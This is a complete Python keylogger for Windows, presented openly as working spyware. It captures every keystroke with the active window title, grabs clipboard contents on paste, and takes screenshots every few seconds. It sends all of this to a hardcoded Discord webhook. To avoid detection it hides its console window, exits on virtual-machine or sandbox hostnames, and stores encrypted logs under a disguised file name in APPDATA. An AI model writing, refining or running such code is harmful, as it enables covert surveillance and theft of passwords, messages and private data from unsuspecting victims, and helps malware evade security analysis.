import pynput.keyboard
import win32gui, win32clipboard, win32api 
import threading, requests, os, ctypes, platform, uuid
from datetime import datetime
from PIL import ImageGrab
from cryptography.fernet import Fernet

WEBHOOK = "https://discord.com/api/webhooks/1377497882411667456/dbtCbYDzXeD-Ek_IoCI2zWV5zs9wwOYNQ6Im_--boIJiHaVlCjFW7gEHD_O8aHY9k-i5"
INTERVAL = 6  
SCREENSHOT_INTERVAL = 5 
SAVE_LOCALLY = True
ENCRYPT_LOGS = True
ENCRYPTION_KEY = Fernet.generate_key()
FERNET = Fernet(ENCRYPTION_KEY)
LOG_PATH = os.path.join(os.getenv("APPDATA"), "syslog_secure.txt")

log = ""
current_window = ""

def get_active_window():
    try:
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd)
    except:
        return "Unknown Window"

def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return f"[CLIPBOARD] {data}"
    except:
        return "[CLIPBOARD] <Error>"

def format_key(key):
    try:
        return key.char
    except AttributeError:
        if key == key.space:
            return " "
        elif key == key.enter:
            return "\n"
        else:
            return f"[{key.name.upper()}]"

def write_local(data):
    if not SAVE_LOCALLY:
        return
    try:
        with open(LOG_PATH, "ab") as f:
            enc = FERNET.encrypt(data.encode())
            f.write(enc + b"\n")
    except Exception as e:
        print("[ERROR] Writing log failed:", e)

def send_discord(data):
    try:
        requests.post(WEBHOOK, json={"content": f"```{data}```"})
    except:
        pass

def capScreenshot():
    try:
        img = ImageGrab.grab()
        path = os.path.join(os.getenv("TEMP"), "screenshot.jpg")
        img.save(path)
        with open(path, "rb") as f:
            requests.post(WEBHOOK, files={"file": f})
        os.remove(path)
    except:
        pass
    threading.Timer(SCREENSHOT_INTERVAL, capScreenshot).start()

def on_key_press(key):
    global log, current_window
    window = get_active_window()

    if window != current_window:
        current_window = window
        header = f"\n[{datetime.now()}] — {window}\n"
        log += header
        write_local(header)

    k = format_key(key)

    if k.lower() == "v" and (win32api.GetAsyncKeyState(0x11) & 0x8000):
        clip = get_clipboard()
        log += clip + "\n"
        write_local(clip)
        print(clip, end="", flush=True)
    else:
        log += k
        write_local(k)
        print(k, end="", flush=True)

def sendStats():
    global log
    if log:
        send_discord(log)
        log = ""
    threading.Timer(INTERVAL, sendStats).start()

def hideConsole():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def ifSandbox():
    suspicious = ['vbox', 'vmware', 'sandbox', 'qemu']
    return any(name in platform.uname().node.lower() for name in suspicious)

def start():
    if ifSandbox():
        print("[DEBUG] Sandbox detected. Exiting.")
        return
    hideConsole()
    sendStats()
    capScreenshot()
    listener = pynput.keyboard.Listener(on_press=on_key_press)
    listener.start()
    listener.join()

if __name__ == "__main__":
    start()
